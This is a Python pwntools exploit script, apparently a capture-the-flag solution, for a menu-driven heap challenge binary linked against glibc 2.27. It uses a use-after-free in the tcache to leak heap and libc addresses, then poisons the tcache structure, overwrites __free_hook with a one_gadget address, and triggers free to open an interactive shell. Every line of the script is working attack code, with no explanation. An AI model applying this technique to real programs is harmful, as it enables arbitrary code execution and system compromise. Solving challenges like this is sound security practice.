from pwn import*
from LD import*
def add(content):
	p.sendlineafter('Your choice:','1')
	p.sendafter('Input the content:',content)
def free(index,sign):
	p.sendlineafter('Your choice:','3')
	p.sendlineafter('idx:',str(index))
	p.sendlineafter('Clear?(y/n):',sign)
def show(index):
	p.sendlineafter('Your choice:','4')
	p.sendlineafter('idx:',str(index))
def edit(index,content):
	p.sendlineafter('Your choice:','2')
	p.sendlineafter('idx:',str(index))
	p.sendafter('Input the content:',content)
libc = ELF('./libc-2.27.so',checksec=False)
LD=change_ld('./main','./ld-2.27.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.27.so'})
context.log_level = 'DEBUG'
add('FMYY') #0
add('FMYY') #1
free(0,'N')
free(1,'N')
show(1)
p.recvuntil('Content:')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x260
for i in range(5):
	free(0,'N')
free(1,'y')
free(0,'y')
payload = p64(0)*7 + p64(0x91) + p64(heap_base + 0x50)
add(payload)
add('FMYY')
free(1,'y')	#free the chunk2 to tcache[0x90]
add('\x00')	#heap_base +0x30
free(0,'y')
payload = p64(0)*3 + p64(heap_base + 0x10)
edit(1,payload)
add('\xFF'*0x40)
free(0,'N')
show(0)
p.recvuntil('Content:')
libc_base = u64(p.recvuntil('\x7F').ljust(8,'\x00')) - 0x70 -libc.sym['__malloc_hook']
libc.address = libc_base
free_hook = libc.sym['__free_hook']
one_gadget = libc_base +0x4F322
edit(0,p64(0x0100000004000000) + '\x00'*0x38)
free(0,'y')
edit(1,p64(0)*3 + p64(free_hook))
add(p64(one_gadget))
p.sendlineafter('Your choice:','3')
p.sendlineafter('idx:',str(0))
p.interactive()
